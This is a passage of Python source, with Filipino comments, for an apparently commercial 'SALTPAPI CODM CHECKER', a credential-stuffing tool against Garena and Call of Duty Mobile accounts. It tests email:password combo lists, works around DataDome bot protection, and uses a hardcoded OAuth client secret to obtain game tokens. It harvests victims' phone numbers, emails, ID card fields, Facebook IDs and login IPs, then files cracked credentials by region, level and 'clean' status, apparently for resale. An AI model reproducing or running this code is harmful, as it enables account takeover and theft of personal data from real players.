    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, "JSON DECODE ERROR"
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                if error_msg == "error_user_ban":
                    return None, "BANNED"
                elif error_msg == "error_no_account":
                    return None, "DOES NOT EXIST"
                elif error_msg == "error_auth":
                    return None, "AUTH FAILED"
                elif error_msg == "error_params":
                    return None, "PARAMS FAILED"
                elif error_msg == "error_security_ban":
                    return None, "SECURITY BANNED"
                else:
                    if attempt < retries - 1:
                        time.sleep(2)
                    return None, f"LOGIN {error_msg}"
            return sso_key, "SUCCESS"
        except requests.RequestException as e:            
            if attempt < retries - 1:
                time.sleep(2)
                continue
    return None, "MAX RETRIES REACHED"

def get_codm_access_token(session):
    random_id = str(int(time.time() * 1000))
    grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
    grant_headers = {
        'Host': '100082.connect.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua-platform': '"Android"',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'sec-ch-ua-mobile': '?1',
        'Origin': 'https://100082.connect.garena.com',
        'X-Requested-With': 'com.garena.game.codm',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    
    device_id = f'02-{str(uuid.uuid4())}'
    
    grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&create_grant=true&id={random_id}'
    
    for attempt in range(3):
        try:
            grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
            grant_json = grant_response.json()
            auth_code = grant_json.get('code', '')
            
            if not auth_code:
                return "", "", ""
            
            token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
            token_headers = {
                'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': '100082.connect.garena.com',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip'
            }
            
            token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
            
            token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
            token_json = token_response.json()
            access_token = token_json.get('access_token', '')
            open_id = token_json.get('open_id', '')
            uid = token_json.get('uid', '')
            
            return access_token, open_id, uid
            
        except Exception as e:
            time.sleep(1.5)
            
    try:
        grant_response = requests.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        
        if not auth_code:
            return "", "", ""
        
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        
        token_response = requests.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        
        return access_token, open_id, uid
    except Exception as e:
        return "", "", ""
        
def process_codm_callback(session, access_token, open_id=None, uid=None):
    old_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
    old_headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
        "referer": "https://auth.garena.com/"
    }
    aos_callback_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
    aos_headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
        "referer": "https://100082.connect.garena.com/",
        "x-requested-with": "com.garena.game.codm"
    }

    for attempt in range(3):
        try:
            old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
            location = old_response.headers.get("Location", "")
            
            if "err=3" in location:
                return None, "no_codm"
            elif "token=" in location:
                token = location.split("token=")[-1].split('&')[0]
                return token, "success"
            
            aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
            aos_location = aos_response.headers.get("Location", "")
            
            if "err=3" in aos_location:
                return None, "no_codm"
            elif "token=" in aos_location:
                token = aos_location.split("token=")[-1].split('&')[0]
                return token, "success"
            
            return None, "unknown_error"
            
        except Exception as e:
            time.sleep(1.5)
            
    try:
        old_response = requests.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        
        aos_response = requests.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get("Location", "")
        
        if "err=3" in aos_location:
            return None, "no_codm"
        elif "token=" in aos_location:
            token = aos_location.split("token=")[-1].split('&')[0]
            return token, "success"
        
        return None, "unknown_error"
    except Exception as e:
        return None, "error"
    
def get_codm_user_info(session, token):
    try:
        import base64
        parts = token.split('.')
        if len(parts) == 3:
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            jwt_data = json.loads(decoded)
            user_data = jwt_data.get('user', {})
            if user_data:
                return {
                    "codm_nickname": user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
                    "codm_level": user_data.get('codm_level', 'N/A'),
                    "region": user_data.get('region', 'N/A'),
                    "uid": user_data.get('uid', 'N/A'),
                    "open_id": user_data.get('open_id', 'N/A'),
                    "t_open_id": user_data.get('t_open_id', 'N/A')
                }
    except Exception as e:
        pass
        
    url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
    headers = {
        "accept": "application/json, text/plain, */*",
        "codm-delete-token": token,
        "origin": "https://delete-request-aos.codm.garena.co.id",
        "referer": "https://delete-request-aos.codm.garena.co.id/",
        "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
        "x-requested-with": "com.garena.game.codm"
    }
    
    for attempt in range(3):
        try:
            response = session.get(url, headers=headers, timeout=15)
            data = response.json()
            user_data = data.get('user', {})
            if user_data:
                return {
                    "codm_nickname": user_data.get('codm_nickname', 'N/A'),
                    "codm_level": user_data.get('codm_level', 'N/A'),
                    "region": user_data.get('region', 'N/A'),
                    "uid": user_data.get('uid', 'N/A'),
                    "open_id": user_data.get('open_id', 'N/A'),
                    "t_open_id": user_data.get('t_open_id', 'N/A')
                }
            else:
                return {}
        except Exception as e:
            time.sleep(1.5)
            
    try:
        response = requests.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {
                "codm_nickname": user_data.get('codm_nickname', 'N/A'),
                "codm_level": user_data.get('codm_level', 'N/A'),
                "region": user_data.get('region', 'N/A'),
                "uid": user_data.get('uid', 'N/A'),
                "open_id": user_data.get('open_id', 'N/A'),
                "t_open_id": user_data.get('t_open_id', 'N/A')
            }
        else:
            return {}
    except Exception as e:
        return {}
        
def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            return has_codm, codm_info
        else:
            codm_token, status = process_codm_callback(session, access_token, open_id, uid)
            
            if status == "no_codm":
                return has_codm, codm_info
            elif status != "success" or not codm_token:
                return has_codm, codm_info
            else:
                codm_info = get_codm_user_info(session, codm_token)
                if codm_info:
                    has_codm = True

    except Exception as e:
        pass
    
    return has_codm, codm_info

def create_account_panel(account_details, codm_info=None):
    if isinstance(account_details, str):
        account_details = {
            'username': account_details,
            'nickname': 'N/A',
            'email': account_details,
            'personal': {
                'mobile_no': 'N/A',
                'country': 'N/A',
                'id_card': 'N/A'
            },
            'bind_status': 'N/A',
            'security_status': 'N/A',
            'profile': {
                'shell_balance': 'N/A'
            },
            'status': {
                'account_status': 'N/A'
            },
            'game_info': [],
            'security': {
                'facebook_connected': False,
                'facebook_account': None
            }
        }
    
    facebook_connected = account_details['security'].get('facebook_connected', False)
    facebook_account = account_details['security'].get('facebook_account', {})
    
    facebook_status = "Connected" if facebook_connected else "Not Connected"
    facebook_username = facebook_account.get('account', facebook_account.get('fb_username', 'N/A')) if facebook_account else 'N/A'
    facebook_uid = facebook_account.get('uid', facebook_account.get('fb_uid', 'N/A')) if facebook_account else 'N/A'
    
    if facebook_account and facebook_username == 'N/A' and facebook_uid == 'N/A':
        facebook_username = str(facebook_account)
        
    table = Table(show_header=False, box=None, padding=(0, 3))
    table.add_column("Field", style="bold cyan", width=16)
    table.add_column("Value")
    
    bind_status = "Clean" if account_details.get('is_clean') else "Bound"
    bind_color = "green" if bind_status == "Clean" else "red"
    binds_list = ", ".join(account_details.get('binds', [])) if account_details.get('binds') else "None"
    
    table.add_row("[bold magenta]✦ ACCOUNT DATA[/bold magenta]", "")
    table.add_row("Username", f"[green]{account_details.get('username', 'N/A')}[/green]")
    table.add_row("Bind Status", f"[{bind_color}]{bind_status}[/{bind_color}]")
    table.add_row("Binds", f"[{bind_color}]{binds_list}[/{bind_color}]")
    table.add_row("Security Status", f"[yellow]{account_details.get('security_status', 'N/A')}[/yellow]")
    table.add_row("FB User", f"[blue]{facebook_username}[/blue]")
    table.add_row("FB UID", f"[blue]{facebook_uid}[/blue]")
    
    if codm_info:
        table.add_row("", "")
        table.add_row("[bold magenta]✦ CODM DATA[/bold magenta]", "")
        table.add_row("Nickname", f"[green]{codm_info.get('codm_nickname', 'N/A')}[/green]")
        table.add_row("G-shell", f"[yellow]{account_details.get('profile', {}).get('shell_balance', '0')}[/yellow]")
        table.add_row("Level", f"[cyan]{codm_info.get('codm_level', 'N/A')}[/cyan]")
        table.add_row("Server", f"[magenta]{codm_info.get('region', 'N/A')}[/magenta]")
        table.add_row("UID", f"[cyan]{codm_info.get('uid', 'N/A')}[/cyan]")
    
    panel = Panel(
        table,
        title="[bold white]✧ SALTPAPI CODM CHECKER ✧[/bold white]",
        subtitle="[dim italic]Thank you for using our checker[/dim italic]",
        border_style="magenta",
        box=ROUNDED,
        expand=False
    )
    return panel

import os

def save_account_details(account, details, codm_info=None, password=None, base_results_dir="Results"):
    try:
        # Siguraduhing gawa ang main results directory
        os.makedirs(base_results_dir, exist_ok=True)
        
        # Pagkuha ng mga basic CODM details
        codm_name = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
        
        # Garena Profile Details
        shell_balance = details.get('profile', {}).get('shell_balance', 0)
        country = details.get('personal', {}).get('country', 'N/A')
        mobile_no = details.get('personal', {}).get('mobile_no', 'N/A')
        
        # Is_clean status tracker
        is_account_clean = details.get('is_clean', False)
        account_status_str = "Clean" if is_account_clean else "Not Clean"

        # Facebook Information Extraction
        facebook_connected = details.get('security', {}).get('facebook_connected', False)
        facebook_account = details.get('security', {}).get('facebook_account', {})
        facebook_username = facebook_account.get('account', facebook_account.get('fb_username', 'N/A')) if facebook_account else 'N/A'
        facebook_uid = facebook_account.get('uid', facebook_account.get('fb_uid', 'N/A')) if facebook_account else 'N/A'
        
        # Login History Extraction
        login_history = details.get('login_history', {})
        last_login_time = login_history.get('time', 'N/A')
        last_login_from = login_history.get('device', login_history.get('from', 'N/A'))
        last_login_ip = login_history.get('ip', 'N/A')
        last_login_country = login_history.get('country', 'N/A')

        bind_details = details.get('bind_status', 'Bound')
        
        # ============================================================
        # FORMAT 1: WALANG SPACE (Para sa Clean/NotClean folders at root txt files)
        # ============================================================
        account_log_oneline = f"{account}"
        if password:
            account_log_oneline = f"{account}:{password}" # Saktong dikit, walang space
            
        c_region = str(codm_region).upper().strip()
        one_line_log = f"{account_log_oneline} | Region: {c_region} | Level: {codm_level} | Bind: {bind_details}\n"

        # ============================================================
        # FORMAT 2: MAY SPACE (Para lang sa main full_details.txt block)
        # ============================================================
        account_log_full = f"{account}"
        if password:
            account_log_full = f"{account} : {password}" # May space sa gilid ng colon

        # DYNAMIC ACCOUNT COUNTER ENGINE (Para sa full_details.txt)
        details_file_path = os.path.join(base_results_dir, 'full_details.txt')
        account_number = 1
        if os.path.exists(details_file_path):
            with open(details_file_path, 'r', encoding='utf-8') as f_read:
                content = f_read.read()
                account_number = content.count("Account:") + 1

        # ============================================================
        # GENERATE THE FULL DETAILS BLOCK FORMAT
        # ============================================================
        full_info_str = f"{account_number}.\n"
        full_info_str += "============================================================\n"
        full_info_str += f"Account: {account_log_full}\n" # Gagamit ng may space
        full_info_str += f"UID: {details.get('uid', 'N/A')}\n"
        full_info_str += f"Username: {details.get('username', 'N/A')}\n"
        full_info_str += f"Garena Shell: {shell_balance}\n"
        full_info_str += f"Email: {details.get('email', 'N/A')}\n"
        full_info_str += f"Mobile: {mobile_no}\n"
        full_info_str += f"Country: {country}\n"
        full_info_str += f"Nickname: {details.get('nickname', 'N/A')}\n\n"
        
        # --- Facebook Section ---
        full_info_str += "--- Facebook Information ---\n"
        if facebook_connected or (facebook_uid and facebook_uid != 'N/A'):
            fb_status = details.get('security', {}).get('facebook_status', 'FB UNBIND or FB DELETED')
            full_info_str += "Search Link: https://legitdax.com/FACEBOOK/fb_pictures.php\n"
            full_info_str += f"Facebook Username: {facebook_username}\n"
            full_info_str += f"Facebook ID: {facebook_uid}\n"
            full_info_str += f"Facebook Status: {fb_status}\n"
            full_info_str += "Note: Visit Search Link and paste Facebook ID\n\n"
        else:
            full_info_str += "Facebook Username: N/A\n"
            full_info_str += "Facebook ID: N/A\n"
            full_info_str += "Facebook Status: NOT CONNECTED\n\n"
            
        # --- CODM Section (DYNAMIC FLAG MAPPING) ---
        region_flags = {
            "PH": "🇵🇭 ", "TH": "🇹🇭 ", "ID": "🇮🇩 ", "VN": "🇻🇳 ", 
            "MY": "🇲🇾 ", "SG": "🇸🇬 ", "TW": "🇹🇼 ", "HK": "🇭🇰 ", 
            "MO": "🇲🇴 ", "US": "🇺🇸 ", "BR": "🇧🇷 ", "MX": "🇲🇽 "
        }
        flag_emoji = region_flags.get(c_region, "🌐 ")
        
        full_info_str += "--- CODM Information ---\n"
        full_info_str += f"Account Level: {codm_level}\n"
        full_info_str += f"Server: {flag_emoji}{codm_region}\n"
        full_info_str += f"IGN: {codm_name}\n"
        full_info_str += f"UID: {codm_uid}\n\n"
        
        # --- Login History Section ---
        full_info_str += "--- Login History ---\n"
        full_info_str += f"Last Login: {last_login_time}\n"
        full_info_str += f"Last Login From: {last_login_from}\n"
        full_info_str += f"Last Login IP: {last_login_ip}\n"
        full_info_str += f"Last Login Country: {last_login_country}\n\n"
        
        # --- Final Status ---
        full_info_str += f"Account Status: {account_status_str}\n"
        full_info_str += "============================================================\n\n"

        # ---- LAGING MAPUPUNTA LAHAT NG VALID SA MAIN full_details.txt ----
        with open(details_file_path, 'a', encoding='utf-8') as f_details:             
            f_details.write(full_info_str)

        # 3. ROOT TEXT FILES SORTING (clean.txt at notclean.txt)
        if is_account_clean:
            root_file_path = os.path.join(base_results_dir, 'clean.txt')
            target_sub_dir = os.path.join(base_results_dir, 'Clean')
        else:
            root_file_path = os.path.join(base_results_dir, 'notclean.txt')
            target_sub_dir = os.path.join(base_results_dir, 'NotClean')

        # Isulat ang one-liner (WALANG SPACE) sa root text files
        with open(root_file_path, 'a', encoding='utf-8') as r_file:
            r_file.write(one_line_log)

        # 4. COUNTRY & LEVEL BUCKETING SA LOOB NG TARGET SUB-FOLDER
        # FIX: Ipinasok na ang open() logic sa loob para hindi magka-UnboundLocalError
        if codm_info and c_region and c_region != 'N/A' and c_region != '':
            country_folder_path = os.path.join(target_sub_dir, c_region)
            os.makedirs(country_folder_path, exist_ok=True)

            try:
                lvl = int(codm_level)
                if 1 <= lvl <= 50: lvl_range = "1-50"
                elif 51 <= lvl <= 100: lvl_range = "51-100"
                elif 101 <= lvl <= 150: lvl_range = "101-150"
                elif 151 <= lvl <= 200: lvl_range = "151-200"
                elif 201 <= lvl <= 250: lvl_range = "201-250"
                elif 251 <= lvl <= 300: lvl_range = "251-300"
                elif 301 <= lvl <= 350: lvl_range = "301-350"
                else: lvl_range = "351+"
            except:
                lvl_range = "Unknown"

            level_file_name = f"{lvl_range}_accounts.txt"
            
            # SAFE: Naka-indent na pukanan kaya gagana lang kapag may maayos na server/region info
            with open(os.path.join(country_folder_path, level_file_name), 'a', encoding='utf-8') as lvl_f:
                lvl_f.write(one_line_log)
        else:
            # FALLBACK: Kung walang CODM info o walang server, dito ihuhulog para walang crash
            no_server_dir = os.path.join(target_sub_dir, "No_Server")
            os.makedirs(no_server_dir, exist_ok=True)
            with open(os.path.join(no_server_dir, "no_server_accounts.txt"), 'a', encoding='utf-8') as no_srv_f:
                no_srv_f.write(one_line_log)
                    
        # ============================================================
        # 🔥 AUTOMATIC SORTING TRIGGER (KABIT DITO)
        # ============================================================
        trigger_results_sorting(base_results_dir)
                       
    except Exception as e:
        print(f"Error saving account: {e}")
    
def parse_account_details(data):
    user_info = data.get('user_info', {})

    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),

        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },

        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },

        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },

        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },

        'binds': [],
        'game_info': []
    }

    email = account_info['email']
    email_v = account_info['email_verified']
    if email != 'N/A' and email and email_v:
        account_info['binds'].append('Email')

    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
        
    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
    account_info['is_clean'] = len(account_info['binds']) == 0
    
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("[WARNING] Suspicious")

    account_info['security_status'] = "[SUCCESS] Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

def save_403_accounts(user_id, account, password):
    try:
        folder_name = f'Containers/{user_id}/403_Retry_Accounts'
        os.makedirs(folder_name, exist_ok=True)
        filename = os.path.join(folder_name, '403_accounts.txt')
        account_line = f"{account}:{password}\n"
        account_exists = False
        if os.path.exists(filename):
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    for line in f:
                        if line.strip().startswith(f"{account}:"):
                            account_exists = True
                            break
            except Exception as e:
                pass
        if not account_exists:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(account_line)
            return True
    except Exception as e:
        return False
        
def checking_system(user_id, session, account, password, cookie_manager, datadome_manager, live_stats, proxy_manager=None, base_results_dir="Results"):
    try:        
        datadome_manager.clear_session_datadome(session)        
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            datadome_manager.set_session_datadome(session, current_datadome)
        else:
            datadome = get_datadome_cookie(session)
            if datadome:
                datadome_manager.set_datadome(datadome)
                datadome_manager.set_session_datadome(session, datadome)
        
        result_prelogin = prelogin(session, account, datadome_manager, proxy_manager)
        
        if len(result_prelogin) == 4:
            v1, v2, new_datadome, prelogin_status = result_prelogin
        else:
            v1, v2, new_datadome = result_prelogin
            prelogin_status = "UNKNOWN"
            
        if v1 == "reset_session":
            return "reset_session", "IP BLOCKED"
            
        if v1 == "save_for_retry":   
            initial_cookie = cookie_manager.get_valid_cookie()
            if initial_cookie:
                applyck(session, initial_cookie)
            save_403_accounts(user_id, account, password)
            live_stats.update_stats(valid=False)
            return "error", prelogin_status
            
        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return "invalid", prelogin_status
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
        
        sso_key, login_status = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return "invalid", login_status
        
        current_cookies = session.cookies.get_dict()
        cookie_parts = []
        for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
            if cookie_name in current_cookies:
                cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
        
        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        
        if cookie_header:
            headers['cookie'] = cookie_header
        
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        
        if response.status_code == 403:
            result = datadome_manager.handle_403(session, account, proxy_manager)
            if result == "reset_session":
                return "reset_session", "IP BLOCKED"
            else:
                live_stats.update_stats(valid=False)
                save_403_accounts(user_id, account, password)
                return "error", "Cookie Flagged Saved for retry"
            
        try:
            account_data = response.json()
        except json.JSONDecodeError:
            live_stats.update_stats(valid=False)
            return "invalid", "Invalid JSON Response"
        
        if 'error' in account_data:
            if account_data.get('error') == 'ACCOUNT DOESNT EXIST':
                live_stats.update_stats(valid=False)
                return "invalid", "DOES NOT EXIST"
            live_stats.update_stats(valid=False)
            return "invalid", f"Init Error {account_data['error']}"
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        # Check CODM Info
        has_codm, codm_info = check_codm_account(session, account)
        
        full_cookie = datadome_manager.extract_full_cookie_from_session(session)
        if full_cookie:
            cookie_manager.save_cookie_from_string(full_cookie)
        
        save_account_details(account, details, codm_info if has_codm else None, password, base_results_dir)
        
        # Pagkuha ng data para sa stats at distribution
        codm_level = codm_info.get('codm_level', 0) if codm_info else 0
        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
        is_clean_acc = details.get('is_clean', True)
        
        # UPDATE STATS (Kasama na ang distribution variables)
        live_stats.update_stats(
            valid=True, 
            clean=is_clean_acc, 
            has_codm=has_codm, 
            level=codm_level, 
            server=codm_region,
            account_line=f"{account}:{password}"
        )
        
        # UI at Logs
        panel = create_account_panel(details, codm_info if has_codm else None)
        codm_name = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        bound_status = "Not Bound" if is_clean_acc else "Bound"
        sec_status = details.get('security_status', 'N/A')
        formatted_log = f"[VALID] {account} | {bound_status} | {sec_status} | {codm_name} | {codm_level} | {codm_region} |"
        
        # Gagawa ng dictionary payload para sa worker
        payload_data = {
            'panel': panel,
            'log': formatted_log,
            'level': codm_level,
            'server': codm_region,
            'clean': is_clean_acc
        }
        
        return "success", payload_data
        
    except Exception as e:
        live_stats.update_stats(valid=False)
        save_403_accounts(user_id, account, password)
        return "error", f"Processing Error {str(e)}"

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")

    txt_files = []
    for root, _, files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt") and not file.endswith("_session.txt"):
                txt_files.append(os.path.join(root, file))

    for file_path in txt_files:
        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
            return file_path

    if txt_files:
        return random.choice(txt_files)

    return os.path.join(combo_folder, "accounts.txt")

def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        unique_lines = []
        seen_lines = set()
        for line in lines:
            stripped_line = line.strip()
            if stripped_line and stripped_line not in seen_lines:
                unique_lines.append(line)
                seen_lines.add(stripped_line)

        if len(lines) == len(unique_lines):
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(unique_lines)
        return True
    except FileNotFoundError:
        return False
    except Exception as e:
        return False

def get_or_create_results_folder(user_id, combo_file_path):
    session_file = f"{combo_file_path}.session"
    if os.path.exists(session_file):
        try:
            with open(session_file, 'r', encoding='utf-8') as f:
                saved_folder = f.read().strip()
            if os.path.exists(saved_folder):
                return saved_folder
        except:
            pass
            
    ph_tz = timezone(timedelta(hours=8))
    now_ph = datetime.now(ph_tz)
    
    root_results = f"Containers/{user_id}/Results"
    os.makedirs(root_results, exist_ok=True)
    
    combo_name = os.path.basename(combo_file_path)

    folder_name = os.path.join(root_results, combo_name)
    
    # 1. Gagawa lang tayo ng main folder para sa mismong result session
    os.makedirs(folder_name, exist_ok=True)
    
    # 2. TINANGGAL NA NATIN DITO YUNG: "Full Info", "Separated Country", "Separated Levels"
    # Dahil automatic na silang gagawin ng bago nating `save_account_details` 
    # sa anyo ng 'Clean', 'NotClean' folders!
    
    with open(session_file, 'w', encoding='utf-8') as f:
        f.write(folder_name)
        
    return folder_name

def get_or_create_user(user_id, username):
    conn = get_db()
    if conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user_row = cursor.fetchone()
        if not user_row:
            cursor.execute("INSERT INTO users (user_id, username, coins) VALUES (?, ?, 0)", (user_id, username))
            conn.commit()
